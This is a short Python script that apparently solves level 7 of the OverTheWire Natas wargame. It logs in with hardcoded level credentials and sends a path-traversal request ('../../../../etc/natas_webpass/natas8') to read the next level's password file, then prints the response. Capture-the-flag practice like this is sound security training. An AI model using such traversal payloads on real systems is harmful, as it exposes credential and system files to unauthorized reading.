#!/bin/python3
import requests

user = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = 'http://%s.natas.labs.overthewire.org/' % user

risposta = requests.get(
    url + '/index.php?page=../../../../etc/natas_webpass/natas8', auth=(user, password))

testo = risposta.text

print(testo)
